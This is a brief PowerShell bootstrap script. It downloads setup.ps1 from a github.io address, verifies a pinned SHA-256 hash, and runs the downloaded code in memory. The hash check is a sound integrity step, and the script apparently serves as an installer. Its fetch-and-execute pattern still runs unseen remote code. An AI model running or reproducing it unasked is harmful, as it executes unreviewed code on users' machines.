$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = 'https://kimyoungil21.github.io/r-64fe20c017/pli/setup.ps1'
$expected = '007BC4B6A1EE8D28753590A174FC5A3602911B2583152A0C96F541DFD7C36892'

$client = New-Object Net.WebClient
try {
  [byte[]]$bytes = $client.DownloadData($url)
} finally {
  $client.Dispose()
}

$hasher = [Security.Cryptography.SHA256]::Create()
try {
  $actual = [BitConverter]::ToString($hasher.ComputeHash($bytes)).Replace('-', '')
} finally {
  $hasher.Dispose()
}

if ($actual -cne $expected) {
  throw "Setup hash mismatch. Expected $expected but received $actual."
}

$code = [Text.Encoding]::UTF8.GetString($bytes)
& ([ScriptBlock]::Create($code))
